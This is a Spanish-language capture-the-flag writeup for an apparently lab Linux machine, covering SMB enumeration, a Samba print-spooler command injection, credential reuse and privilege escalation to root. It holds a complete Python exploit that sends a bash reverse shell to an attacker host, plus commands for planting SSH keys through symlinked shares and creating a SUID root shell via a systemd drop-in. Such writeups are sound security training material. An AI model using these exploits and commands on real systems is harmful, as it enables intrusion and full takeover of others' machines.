
**Dificultad:** Medium  
**OS:** Linux  
**Fecha:** Junio 2026  
**Autor del writeup:** Ivan Villalba

---

## Índice

1. [Reconocimiento](#reconocimiento)
2. [Enumeración SMB](#enumeraci%C3%B3n-smb)
3. [Foothold — CVE-2026-4480](#foothold--cve-2026-4480)
4. [Shell como nobody → Usuario scott](#shell-como-nobody--usuario-scott)
5. [Escalada scott → marcus](#escalada-scott--marcus)
6. [Escalada marcus → root](#escalada-marcus--root)
7. [Lecciones aprendidas](#lecciones-aprendidas)

---

## Reconocimiento

```bash
ping -c 1 10.129.33.2
nmap -p22,139,445 -sCV 10.129.33.2 -oN escaneo
```

El ping confirma que la máquina está activa y el TTL=63 indica Linux.

El escaneo de Nmap revela tres puertos abiertos:

|Puerto|Servicio|Versión|
|---|---|---|
|22|SSH|OpenSSH 9.6p1 Ubuntu|
|139|SMB|Samba 4|
|445|SMB|Samba 4|

**No hay servicio web.** El vector de ataque inicial es necesariamente SMB.

---

## Enumeración SMB

### Listar shares sin credenciales

```bash
smbclient -L //10.129.33.2 -N
```

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service
```

El flag `-N` indica null session (sin contraseña). Aparecen dos shares de disco y una impresora.

### Intentar acceso a cada share

```bash
smbclient //10.129.33.2/projects -N   # ACCESS DENIED
smbclient //10.129.33.2/transfer -N   # ACCESS DENIED
smbclient //10.129.33.2/HP-Reception -N  # ACCESO PERMITIDO (guest)
```

Los shares de disco requieren credenciales, pero **la impresora acepta conexiones anónimas**. Esto es relevante porque es exactamente la precondición de CVE-2026-4480.

### Enumerar usuarios con rpcclient

```bash
rpcclient -U "" -N 10.129.33.2
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]

rpcclient $> queryuser 0x3e8
User Name   : scott
Full Name   : Scott Mercer
Password last set: Tue, 02 Jun 2026
```

Se identifica un único usuario: **scott** (Scott Mercer). Con un usuario conocido y SMB expuesto, el siguiente paso lógico sería fuerza bruta, pero el vector real es la vulnerabilidad en el servicio de impresión.

---

## Foothold — CVE-2026-4480

### ¿Qué es esta vulnerabilidad?

CVE-2026-4480 es una inyección de comandos en el subsistema de impresión de Samba. Cuando un trabajo de impresión termina de hacer spool, Samba ejecuta el `print command` configurado en `smb.conf` a través de una llamada `system()`, sustituyendo macros en el string:

- `%s` → ruta del archivo de spool
- `%J` → **nombre del trabajo de impresión, tal como lo envía el cliente**

El problema: `%J` no se sanitiza correctamente. Solo se reemplaza la comilla simple `'` por `_`, pero caracteres como `|`, `;`, `&`, `<`, `>` llegan intactos al shell. Esto permite inyectar comandos arbitrarios.

La configuración vulnerable en esta máquina es:

```
print command = /usr/local/bin/printaudit %J %s
```

Si el job name es `|sh`, Samba ejecuta:

```bash
/usr/local/bin/printaudit |sh <spoolfile>
```

Lo que hace que el contenido del archivo de spool se ejecute como script de shell.

### ¿Por qué smbclient no sirve para explotar esto?

El path normal (`smbclient -c "print"`) usa la interfaz RAP legacy, que sanitiza los metacaracteres antes de que lleguen a `%J`. Para llegar a la sustitución vulnerable hay que hablar directamente con la interfaz RPC del spooler (`spoolss`), que es lo que exponen los bindings Python de Samba.

### El exploit

Creamos `exploit.py` con nuestras IPs:

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "10.129.33.2", "10.10.15.5", 4444

# Payload: reverse shell desacoplada del proceso padre con setsid
# Importante: debe ir en background (&) porque EndDocPrinter es sincrónico
# Un reverse shell en foreground bloquearía smbd y haría timeout al RPC
DATA = ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n" % (LHOST, LPORT)).encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()

# Bind al pipe spoolss — credenciales anónimas son suficientes
iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)

# Obtener handle al share de impresora (acceso guest)
h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)

# document_name = "|sh" → esto aterra en %J → inyección
i1 = spoolss.DocumentInfo1(); i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1

# Ciclo de vida del trabajo: StartDoc → StartPage → Write → EndPage → EndDoc
# EndDocPrinter es el trigger que ejecuta el print command
iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h); iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)

print("[+] job submitted")
```

### Ejecución

```bash
# Terminal 1: listener
nc -lvnp 4444

# Terminal 2: exploit
python3 exploit.py
```

---

## Shell como nobody → Usuario scott

La shell llega como `nobody` (la cuenta del servicio de impresión).

```bash
nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

El archivo de configuración de rclone es legible por todos. rclone no cifra las contraseñas, solo las "ofusca" con una codificación base64 reversible. El propio rclone puede decodificarlas:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# → iXzvcib3SrpZ
```

La contraseña fue reutilizada para la cuenta del sistema `scott`:

```bash
ssh scott@10.129.33.2
# Password: iXzvcib3SrpZ

scott@abducted:~$ cat user.txt
# FLAG CONSEGUIDA
```

---

## Escalada scott → marcus

### Analizando la configuración de Samba

```bash
cat /etc/samba/shares.conf
```

El share `transfer` tiene dos directivas críticas:

```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus     # todas las operaciones se ejecutan como marcus
   read only = no
   wide links = yes        # Samba sigue symlinks fuera del directorio compartido
```

Y en el `smb.conf` global:

```ini
unix extensions = no
allow insecure wide links = yes
```

**¿Qué significa esto?**

- `force user = marcus`: cualquier archivo creado a través del share pertenece a marcus, independientemente de quién se autenticó.
- `wide links = yes` + `allow insecure wide links = yes`: Samba seguirá symlinks aunque apunten fuera del árbol del share.
- `unix extensions = no`: necesario para que `wide links` funcione (Samba lo deshabilita cuando están activas las extensiones Unix).

Combinados, estos parámetros permiten escribir archivos en cualquier parte del sistema como marcus, usando a scott como punto de entrada.

### Planting the SSH key

```bash
# Generar par de claves
ssh-keygen -q -t ed25519 -N '' -f /tmp/k

# Crear symlink: /srv/transfer/mh → /home/marcus
ln -s /home/marcus /srv/transfer/mh

# Usar smbclient para crear .ssh y subir la clave pública
# Samba sigue el symlink y escribe como marcus
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'

# Conectarse como marcus con la clave privada
ssh -i /tmp/k marcus@127.0.0.1
```

---

## Escalada marcus → root

### ¿Por qué marcus puede escalar?

marcus pertenece al grupo `operators`. Ese grupo tiene permisos de escritura sobre `/etc/systemd/system/smbd.service.d/`:

```bash
ls -ld /etc/systemd/system/smbd.service.d
# drwxrws--- 2 root operators 4096 ... /etc/systemd/system/smbd.service.d
```

El bit `s` (setgid) en el directorio garantiza que los archivos creados dentro heredan el grupo `operators`.

Cualquier archivo `*.conf` en ese directorio es un **systemd drop-in**: se fusiona con la unidad `smbd.service` al recargar. Las directivas `ExecStartPre=` se ejecutan antes del proceso principal, **como el usuario del servicio — en este caso, root**.

### Verificar permisos polkit

```bash
for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

La acción relevante que aparece como permitida es:

```
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

Y `systemctl restart smbd` también está permitido para `operators` (la regla polkit es condicional al unit `smbd.service`).

### Exploit

```bash
# Escribir el drop-in: copiar bash y darle SUID root
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF

# Recargar y reiniciar (permitido sin contraseña por polkit)
systemctl daemon-reload
systemctl restart smbd

# Ejecutar bash SUID con privilegios efectivos de root
/tmp/.rb -p -c 'id; cat /root/root.txt'
```

```
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
# ROOT FLAG CONSEGUIDA
```

---

## Lecciones aprendidas

|Concepto|Descripción|
|---|---|
|**CVE-2026-4480**|El nombre del trabajo de impresión es controlado por el cliente y llega sin sanitizar a una llamada `system()`. La vía de explotación requiere hablar directamente con el pipe RPC `spoolss`, no con smbclient.|
|**rclone obscured passwords**|La ofuscación de rclone es reversible con `rclone reveal`. Nunca es equivalente a cifrado real.|
|**Samba force user + wide links**|La combinación de estos parámetros permite escribir archivos como otro usuario del sistema siguiendo symlinks fuera del share. Un vector de escalada poco conocido pero muy efectivo.|
|**systemd drop-ins + polkit**|Si un grupo tiene escritura sobre un directorio de drop-ins de un servicio que corre como root, y polkit permite reiniciar ese servicio, la escalada a root es directa.|

---
